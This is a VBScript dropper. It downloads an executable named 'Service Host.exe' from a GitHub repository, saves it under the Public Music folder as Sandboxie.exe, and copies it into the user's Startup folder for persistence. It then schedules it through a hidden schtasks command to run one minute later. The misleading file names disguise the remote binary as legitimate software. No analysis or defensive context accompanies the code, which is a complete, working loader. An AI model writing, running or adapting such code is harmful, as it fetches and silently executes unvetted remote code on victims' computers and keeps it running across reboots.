' download_and_schedule.vbs
Option Explicit

Dim URL, Destination, objXMLHTTP, objStream, objShell, PublicPath, DestFolder, objFSO
Dim TaskName, RunTime, ScheduleCmd, hh, mm

' === Setup paths ===
URL = "https://github.com/Easy-Hash/download-now/raw/refs/heads/master/Service%20Host.exe"
Set objShell = CreateObject("WScript.Shell")
PublicPath = objShell.ExpandEnvironmentStrings("%PUBLIC%")
DestFolder = PublicPath & "\Music"
Destination = DestFolder & "\Sandboxie.exe"

' === Ensure destination folder exists ===
Set objFSO = CreateObject("Scripting.FileSystemObject")
If Not objFSO.FolderExists(DestFolder) Then
    On Error Resume Next
    objFSO.CreateFolder DestFolder
    On Error GoTo 0
End If

' === Download file ===
On Error Resume Next
Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
objXMLHTTP.Open "GET", URL, False
objXMLHTTP.Send

If Err.Number <> 0 Then
    MsgBox "Network error during download: " & Err.Number & " - " & Err.Description, vbExclamation, "Download error"
    WScript.Quit 1
End If

If objXMLHTTP.Status = 200 Then
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' Binary
    objStream.Open
    objStream.Write objXMLHTTP.ResponseBody
    objStream.SaveToFile Destination, 2 ' Overwrite if exists
    objStream.Close

    ' === Schedule task to run in 1 minute ===
    RunTime = DateAdd("n", 1, Now)
    hh = Right("0" & Hour(RunTime), 2)
    mm = Right("0" & Minute(RunTime), 2)
    TaskName = "RunSandboxie_" & Replace(FormatDateTime(Now, 2), "/", "") & "_" & Replace(FormatDateTime(Now, 4), ":", "")

    ScheduleCmd = "schtasks /create /tn " & Chr(34) & TaskName & Chr(34) & _
                  " /tr " & Chr(34) & Destination & Chr(34) & _
                  " /sc once /st " & hh & ":" & mm & " /f"
' === Also copy to Startup folder ===
    Dim StartupPath, StartupDest
    StartupPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup"
    StartupDest = StartupPath & "\Sandboxie.exe"

    If objFSO.FileExists(Destination) Then
        On Error Resume Next
        objFSO.CopyFile Destination, StartupDest, True ' Overwrite if exists
        On Error GoTo 0
    End If


    objShell.Run ScheduleCmd, 0, True
Else
    MsgBox "Download failed! HTTP Status: " & objXMLHTTP.Status, vbExclamation, "Download failed"
End If

' === Cleanup ===
On Error Resume Next
Set objXMLHTTP = Nothing
Set objStream = Nothing
Set objShell = Nothing
Set objFSO = Nothing
